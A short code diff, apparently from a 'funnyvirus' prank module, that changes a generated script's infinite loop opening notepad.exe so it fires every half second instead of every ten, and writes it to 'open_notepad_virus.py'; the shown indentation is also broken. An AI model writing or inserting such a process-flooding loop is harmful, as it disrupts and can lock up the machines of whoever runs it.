@@ -26,7 +26,7 @@ def sayhack():
 def open_note():
 while True:
     Popen(["notepad.exe"])
-    time.sleep(10)
+    time.sleep(0.5)
     ''')
         
     f = open("../modules/funnyvirus/open_notepad_virus.py","w")
